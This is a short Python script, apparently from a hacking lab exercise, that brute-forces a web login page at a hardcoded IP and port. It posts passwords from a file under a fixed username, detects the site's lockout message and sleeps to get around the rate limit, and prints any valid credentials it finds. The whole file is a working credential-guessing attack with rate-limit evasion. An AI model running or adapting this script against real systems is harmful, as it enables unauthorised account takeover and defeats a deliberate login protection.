import requests
import time

# file that contain user:pass
pass_file = "pass.txt"

# create url using user and password as argument
url = "http://178.128.171.82:31442/login.php"

# rate limit blocks for 30 seconds
lock_time = 31

# message that alert us we hit rate limit
lock_message = "Too many login failures"

# read and password
with open(pass_file, "r") as fh:
    for fline in fh:
        # skip comment
        if fline.startswith("#"):
            continue

        username = "support.us"
        password = fline.rstrip()
        submit = "submit"

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit": submit
        }
        
        # do the request
        res = requests.post(url, data=data)
        
        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print("[-] Hit rate limit, sleeping 30")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)
        else:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
